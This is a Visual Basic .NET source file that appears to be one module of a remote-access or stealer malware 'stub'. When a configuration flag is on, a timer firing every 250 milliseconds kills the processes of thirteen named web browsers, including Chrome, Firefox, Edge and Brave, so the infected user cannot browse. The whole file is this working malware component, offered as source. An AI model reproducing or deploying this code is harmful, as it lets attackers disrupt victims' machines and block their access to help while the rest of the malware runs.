Imports System
Imports System.Diagnostics
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices
Imports j

Namespace Stub
    Public Class xxma



        Public Shared Sub Handler(ByVal sender As Object, ByVal e As ElapsedEventArgs)

            'kll browsers if enabled
            If OK.nowifi = "on" Then

                Dim process As Process
                For Each process In Process.GetProcessesByName("Chrome")
                    Try
                        process.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim processs As Process
                For Each processs In Process.GetProcessesByName("Firefox")
                    Try
                        processs.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim processss As Process
                For Each processss In Process.GetProcessesByName("Chromium")
                    Try
                        processss.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim processa As Process
                For Each processa In Process.GetProcessesByName("Opera")
                    Try
                        processa.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim procesbs As Process
                For Each procesbs In Process.GetProcessesByName("OperaGX")
                    Try
                        procesbs.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim procesbsa As Process
                For Each procesbsa In Process.GetProcessesByName("MSEdge")
                    Try
                        procesbsa.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim procesbsaq As Process
                For Each procesbsaq In Process.GetProcessesByName("Safari")
                    Try
                        procesbsaq.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim procesbsaqq As Process
                For Each procesbsaqq In Process.GetProcessesByName("Brave")
                    Try
                        procesbsaqq.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim seprocesbsa As Process
                For Each seprocesbsa In Process.GetProcessesByName("Iridium")
                    Try
                        seprocesbsa.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim qweprocesbsa As Process
                For Each qweprocesbsa In Process.GetProcessesByName("Dissenter")
                    Try
                        qweprocesbsa.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim qwqwprocesbsa As Process
                For Each qwqwprocesbsa In Process.GetProcessesByName("PaleMoon")
                    Try
                        qwqwprocesbsa.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim xcprocesbsa As Process
                For Each xcprocesbsa In Process.GetProcessesByName("Vivaldi")
                    Try
                        xcprocesbsa.Kill()
                    Catch ex As Exception
                    End Try
                Next

                Dim miprocesbsa As Process
                For Each miprocesbsa In Process.GetProcessesByName("iExplore")
                    Try
                        miprocesbsa.Kill()
                    Catch ex As Exception
                    End Try
                Next


            Else

            End If





        End Sub

        Public Shared Sub Start()
            xxma.xTimer = New Timer(250)
            AddHandler xxma.xTimer.Elapsed, New ElapsedEventHandler(AddressOf xxma.Handler)
            xxma.xTimer.Enabled = True
        End Sub


        ' Fields
        Private Shared xTimer As Timer
        '' Private Shared xN As j.OK = New j.OK
    End Class
End Namespace

